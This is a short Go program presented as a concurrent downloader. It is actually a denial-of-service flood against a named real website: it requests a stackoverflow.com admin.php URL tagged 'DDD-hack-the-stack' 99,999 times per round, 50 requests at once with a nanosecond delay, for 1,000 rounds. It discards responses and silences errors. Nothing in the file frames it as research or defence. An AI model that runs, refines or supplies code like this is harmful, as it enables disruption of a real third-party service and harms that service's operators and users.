package main

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func downloadLink(url string, wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()

	resp, err := client.Get(url)
	if err != nil {
		// fmt.Printf("Error downloading %s: %s\n", url, err.Error())
		return
	}
	defer resp.Body.Close()

	// Handle the response here
	// ...

	// fmt.Printf("Downloaded %s\n", url)
}

func downloadAll(urls []string) {
	concurrencyLimit := 50
	delay := 1 * time.Nanosecond // Adjust the delay value as needed

	client := http.Client{}
	wg := sync.WaitGroup{}
	semaphore := make(chan struct{}, concurrencyLimit)

	for _, url := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer func() { <-semaphore }()
			downloadLink(u, &wg, &client)
			time.Sleep(delay)
		}(url)
	}

	wg.Wait()
}

func main() {
	urlList := make([]string, 99999)
	for i := range urlList {
		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack"
	}

	iterations := 1000 // Number of times to iterate the code

	for i := 0; i < iterations; i++ {
		start := time.Now()
		downloadAll(urlList)
		end := time.Now()
		duration := end.Sub(start)
		minutes := duration.Minutes()
		fmt.Printf("Iteration %d: Downloaded %d links in %.2f minutes\n", i+1, len(urlList), minutes)
	}
}
